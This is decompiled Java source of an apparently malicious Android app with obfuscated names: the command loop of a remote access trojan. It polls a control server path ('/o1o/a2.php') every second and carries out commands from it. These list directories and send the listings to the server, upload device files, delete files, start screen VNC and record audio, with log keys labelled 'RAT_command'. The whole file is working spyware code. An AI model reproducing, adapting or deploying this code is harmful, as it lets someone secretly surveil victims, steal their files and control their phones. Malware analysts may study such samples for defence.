package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import wocwvy.czyxoxmbauu.slsa.oyqwzkyy.C0067b;

public class xelytgswelv extends IntentService {

    /* renamed from: a */
    String f597a = "";

    /* renamed from: b */
    C0034b f598b = new C0034b();

    /* renamed from: c */
    C0039c f599c = new C0039c();

    /* renamed from: d */
    C0067b f600d = new C0067b();

    /* renamed from: e */
    C0033a f601e = new C0033a();

    public xelytgswelv() {
        super("xelytgswelv");
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Can't wrap try/catch for region: R(4:1|2|5|(2:56|7)(3:8|(4:10|(3:12|(1:14)|15)(2:16|(4:18|19|20|58)(2:24|(4:26|27|28|60)(2:29|(2:31|(2:33|62)(1:61))(4:34|(1:36)(4:38|(2:40|(1:42)(1:64))(2:44|(2:46|(1:48)(1:66))(2:49|(1:51)(2:52|(2:54|68)(1:67))))|43|65)|37|63))))|23|59)(1:57)|55)) */
    /* JADX WARNING: Code restructure failed: missing block: B:3:0x0018, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:4:0x0019, code lost:
        r0.printStackTrace();
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:1:0x0010 */
    /* JADX WARNING: Removed duplicated region for block: B:1:0x0010 A[LOOP:0: B:1:0x0010->B:55:0x0010, LOOP_START, SYNTHETIC, Splitter:B:1:0x0010] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onHandleIntent(android.content.Intent r9) {
        /*
            r8 = this;
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r0 = r0.mo247q(r8)
            java.lang.String r1 = " "
            java.lang.String r2 = ""
            java.lang.String r0 = r0.replace(r1, r2)
            r8.f597a = r0
        L_0x0010:
            java.util.concurrent.TimeUnit r0 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x0018 }
            r1 = 1000(0x3e8, double:4.94E-321)
            r0.sleep(r1)     // Catch:{ InterruptedException -> 0x0018 }
            goto L_0x001c
        L_0x0018:
            r0 = move-exception
            r0.printStackTrace()
        L_0x001c:
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "websocket"
            java.lang.String r0 = r0.mo234e(r8, r1)
            java.lang.String r1 = ""
            boolean r1 = r0.equals(r1)
            if (r1 == 0) goto L_0x002d
            return
        L_0x002d:
            wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b r1 = r8.f600d
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            r2.append(r0)
            wocwvy.czyxoxmbauu.slsa.c r3 = r8.f599c
            r3.getClass()
            java.lang.String r3 = "/o1o/a2.php"
            r2.append(r3)
            java.lang.String r2 = r2.toString()
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "tuk_tuk="
            r3.append(r4)
            wocwvy.czyxoxmbauu.slsa.b r4 = r8.f598b
            java.lang.StringBuilder r5 = new java.lang.StringBuilder
            r5.<init>()
            java.lang.String r6 = r8.f597a
            r5.append(r6)
            java.lang.String r6 = "|:| "
            r5.append(r6)
            java.lang.String r5 = r5.toString()
            java.lang.String r4 = r4.mo225c(r5)
            r3.append(r4)
            java.lang.String r3 = r3.toString()
            java.lang.String r1 = r1.mo364b(r2, r3)
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b
            java.lang.String r1 = r2.mo230d(r1)
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b
            java.lang.String r3 = "RATresponce"
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = ""
            r4.append(r5)
            r4.append(r1)
            java.lang.String r4 = r4.toString()
            r2.mo213a(r3, r4)
            java.lang.String r2 = "**"
            if (r1 == r2) goto L_0x0010
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b
            java.lang.String r3 = "RAT_command"
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = ""
            r4.append(r5)
            r4.append(r1)
            java.lang.String r4 = r4.toString()
            r2.mo213a(r3, r4)
            java.lang.String r2 = "opendir:"
            boolean r2 = r1.contains(r2)
            r3 = 0
            if (r2 == 0) goto L_0x015f
            java.lang.String r2 = "opendir:"
            java.lang.String r4 = ""
            java.lang.String r1 = r1.replace(r2, r4)
            java.lang.String r2 = "!!!!"
            java.lang.String[] r1 = r1.split(r2)
            r1 = r1[r3]
            java.lang.String r2 = "getExternalStorageDirectory"
            boolean r2 = r1.contains(r2)
            if (r2 == 0) goto L_0x00d6
            java.io.File r1 = android.os.Environment.getExternalStorageDirectory()
            java.lang.String r1 = r1.getAbsolutePath()
        L_0x00d6:
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b
            java.io.File r3 = new java.io.File
            r3.<init>(r1)
            java.lang.String r2 = r2.mo219b(r3)
            wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b r3 = r8.f600d
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            r4.append(r0)
            wocwvy.czyxoxmbauu.slsa.c r0 = r8.f599c
            r0.getClass()
            java.lang.String r0 = "/o1o/a2.php"
            r4.append(r0)
            java.lang.String r0 = r4.toString()
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = "tuk_tuk="
            r4.append(r5)
            wocwvy.czyxoxmbauu.slsa.b r5 = r8.f598b
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            java.lang.String r7 = r8.f597a
            r6.append(r7)
            java.lang.String r7 = "|:|getPath!!!!"
            r6.append(r7)
            r6.append(r1)
            java.lang.String r7 = "!@@!"
            r6.append(r7)
            r6.append(r2)
            java.lang.String r6 = r6.toString()
            java.lang.String r5 = r5.mo225c(r6)
            r4.append(r5)
            java.lang.String r4 = r4.toString()
            r3.mo364b(r0, r4)
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r3 = "path"
            java.lang.StringBuilder r4 = new java.lang.StringBuilder
            r4.<init>()
            java.lang.String r5 = "getPath!!!!"
            r4.append(r5)
            r4.append(r1)
            java.lang.String r1 = r4.toString()
            r0.mo213a(r3, r1)
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sss"
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "getFileFolder"
            r3.append(r4)
            r3.append(r2)
            java.lang.String r2 = r3.toString()
            goto L_0x01d4
        L_0x015f:
            java.lang.String r2 = "downloadfile:"
            boolean r2 = r1.contains(r2)
            if (r2 == 0) goto L_0x01d9
            java.lang.String r2 = "downloadfile:"
            java.lang.String r4 = ""
            java.lang.String r1 = r1.replace(r2, r4)
            java.lang.String r2 = "!!!!"
            java.lang.String[] r1 = r1.split(r2)
            r1 = r1[r3]
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b
            java.lang.String r3 = "file"
            r2.mo213a(r3, r1)
            wocwvy.czyxoxmbauu.slsa.b r2 = r8.f598b     // Catch:{ Exception -> 0x01ce }
            java.lang.String r3 = ""
            java.lang.String r4 = "getfiles[]"
            r2.mo211a(r8, r1, r3, r4)     // Catch:{ Exception -> 0x01ce }
            wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b r1 = r8.f600d     // Catch:{ Exception -> 0x01ce }
            java.lang.StringBuilder r2 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01ce }
            r2.<init>()     // Catch:{ Exception -> 0x01ce }
            r2.append(r0)     // Catch:{ Exception -> 0x01ce }
            wocwvy.czyxoxmbauu.slsa.c r0 = r8.f599c     // Catch:{ Exception -> 0x01ce }
            r0.getClass()     // Catch:{ Exception -> 0x01ce }
            java.lang.String r0 = "/o1o/a2.php"
            r2.append(r0)     // Catch:{ Exception -> 0x01ce }
            java.lang.String r0 = r2.toString()     // Catch:{ Exception -> 0x01ce }
            java.lang.StringBuilder r2 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01ce }
            r2.<init>()     // Catch:{ Exception -> 0x01ce }
            java.lang.String r3 = "tuk_tuk="
            r2.append(r3)     // Catch:{ Exception -> 0x01ce }
            wocwvy.czyxoxmbauu.slsa.b r3 = r8.f598b     // Catch:{ Exception -> 0x01ce }
            java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x01ce }
            r4.<init>()     // Catch:{ Exception -> 0x01ce }
            java.lang.String r5 = r8.f597a     // Catch:{ Exception -> 0x01ce }
            r4.append(r5)     // Catch:{ Exception -> 0x01ce }
            java.lang.String r5 = "|:|!!!refreshfilefolder!!!"
            r4.append(r5)     // Catch:{ Exception -> 0x01ce }
            java.lang.String r4 = r4.toString()     // Catch:{ Exception -> 0x01ce }
            java.lang.String r3 = r3.mo225c(r4)     // Catch:{ Exception -> 0x01ce }
            r2.append(r3)     // Catch:{ Exception -> 0x01ce }
            java.lang.String r2 = r2.toString()     // Catch:{ Exception -> 0x01ce }
            r1.mo364b(r0, r2)     // Catch:{ Exception -> 0x01ce }
            goto L_0x0010
        L_0x01ce:
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sss"
            java.lang.String r2 = "error sender"
        L_0x01d4:
            r0.mo213a(r1, r2)
            goto L_0x0010
        L_0x01d9:
            java.lang.String r2 = "deletefilefolder:"
            boolean r2 = r1.contains(r2)
            if (r2 == 0) goto L_0x025e
            java.lang.String r2 = "deletefilefolder:"
            java.lang.String r4 = ""
            java.lang.String r1 = r1.replace(r2, r4)     // Catch:{ Exception -> 0x0010 }
            java.io.File r2 = new java.io.File     // Catch:{ Exception -> 0x0010 }
            java.lang.String r4 = "!!!!"
            java.lang.String[] r1 = r1.split(r4)     // Catch:{ Exception -> 0x0010 }
            r1 = r1[r3]     // Catch:{ Exception -> 0x0010 }
            r2.<init>(r1)     // Catch:{ Exception -> 0x0010 }
            r2.delete()     // Catch:{ Exception -> 0x0010 }
            wocwvy.czyxoxmbauu.slsa.b r1 = r8.f598b     // Catch:{ Exception -> 0x0010 }
            java.io.File r3 = new java.io.File     // Catch:{ Exception -> 0x0010 }
            java.lang.String r4 = r2.getParent()     // Catch:{ Exception -> 0x0010 }
            r3.<init>(r4)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r1 = r1.mo219b(r3)     // Catch:{ Exception -> 0x0010 }
            wocwvy.czyxoxmbauu.slsa.oyqwzkyy.b r3 = r8.f600d     // Catch:{ Exception -> 0x0010 }
            java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0010 }
            r4.<init>()     // Catch:{ Exception -> 0x0010 }
            r4.append(r0)     // Catch:{ Exception -> 0x0010 }
            wocwvy.czyxoxmbauu.slsa.c r0 = r8.f599c     // Catch:{ Exception -> 0x0010 }
            r0.getClass()     // Catch:{ Exception -> 0x0010 }
            java.lang.String r0 = "/o1o/a2.php"
            r4.append(r0)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r0 = r4.toString()     // Catch:{ Exception -> 0x0010 }
            java.lang.StringBuilder r4 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0010 }
            r4.<init>()     // Catch:{ Exception -> 0x0010 }
            java.lang.String r5 = "tuk_tuk="
            r4.append(r5)     // Catch:{ Exception -> 0x0010 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r8.f598b     // Catch:{ Exception -> 0x0010 }
            java.lang.StringBuilder r6 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0010 }
            r6.<init>()     // Catch:{ Exception -> 0x0010 }
            java.lang.String r7 = r8.f597a     // Catch:{ Exception -> 0x0010 }
            r6.append(r7)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r7 = "|:|getPath!!!!"
            r6.append(r7)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r2 = r2.getParent()     // Catch:{ Exception -> 0x0010 }
            r6.append(r2)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r2 = "!@@!"
            r6.append(r2)     // Catch:{ Exception -> 0x0010 }
            r6.append(r1)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r1 = r6.toString()     // Catch:{ Exception -> 0x0010 }
            java.lang.String r1 = r5.mo225c(r1)     // Catch:{ Exception -> 0x0010 }
            r4.append(r1)     // Catch:{ Exception -> 0x0010 }
            java.lang.String r1 = r4.toString()     // Catch:{ Exception -> 0x0010 }
            r3.mo364b(r0, r1)     // Catch:{ Exception -> 0x0010 }
            goto L_0x0010
        L_0x025e:
            java.lang.String r0 = "startscreenVNC"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x028a
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.nvsdtnxkzjgw> r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.nvsdtnxkzjgw.class
            boolean r0 = r0.mo215a(r8, r1)
            if (r0 != 0) goto L_0x0010
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "vnc"
            java.lang.String r2 = "start"
            r0.mo233d(r8, r1, r2)
            android.content.Intent r0 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.cwwzcpcu> r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy.cwwzcpcu.class
            r0.<init>(r8, r1)
            r1 = 268435456(0x10000000, float:2.5243549E-29)
            r0.addFlags(r1)
            r8.startActivity(r0)
            goto L_0x0010
        L_0x028a:
            java.lang.String r0 = "stopscreenVNC"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x029d
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "vnc"
        L_0x0296:
            java.lang.String r2 = "stop"
            r0.mo233d(r8, r1, r2)
            goto L_0x0010
        L_0x029d:
            java.lang.String r0 = "startsound"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x02d0
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            wocwvy.czyxoxmbauu.slsa.a r1 = r8.f601e
            java.lang.String[] r1 = r1.f340g
            r1 = r1[r3]
            boolean r0 = r0.mo229c(r8, r1)
            if (r0 == 0) goto L_0x0010
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sound"
            java.lang.String r2 = "start"
            r0.mo233d(r8, r1, r2)
            android.content.Intent r0 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb> r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb.class
            r0.<init>(r8, r1)
            java.lang.String r1 = "str"
            java.lang.String r2 = "no"
        L_0x02c7:
            android.content.Intent r0 = r0.putExtra(r1, r2)
            r8.startService(r0)
            goto L_0x0010
        L_0x02d0:
            java.lang.String r0 = "startforegroundsound"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x02fb
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            wocwvy.czyxoxmbauu.slsa.a r1 = r8.f601e
            java.lang.String[] r1 = r1.f340g
            r1 = r1[r3]
            boolean r0 = r0.mo229c(r8, r1)
            if (r0 == 0) goto L_0x0010
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sound"
            java.lang.String r2 = "start foreground"
            r0.mo233d(r8, r1, r2)
            android.content.Intent r0 = new android.content.Intent
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb> r1 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb.class
            r0.<init>(r8, r1)
            java.lang.String r1 = "str"
            java.lang.String r2 = "foreground"
            goto L_0x02c7
        L_0x02fb:
            java.lang.String r0 = "stopsound"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x0308
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sound"
            goto L_0x0296
        L_0x0308:
            java.lang.String r0 = "**noconnection**"
            boolean r0 = r1.contains(r0)
            if (r0 == 0) goto L_0x0010
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "websocket"
            java.lang.String r2 = ""
            r0.mo233d(r8, r1, r2)
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "vnc"
            java.lang.String r2 = "stop"
            r0.mo233d(r8, r1, r2)
            wocwvy.czyxoxmbauu.slsa.b r0 = r8.f598b
            java.lang.String r1 = "sound"
            java.lang.String r2 = "stop"
            r0.mo233d(r8, r1, r2)
            r8.stopService(r9)
            goto L_0x0010
        */
        throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.xelytgswelv.onHandleIntent(android.content.Intent):void");
    }
}
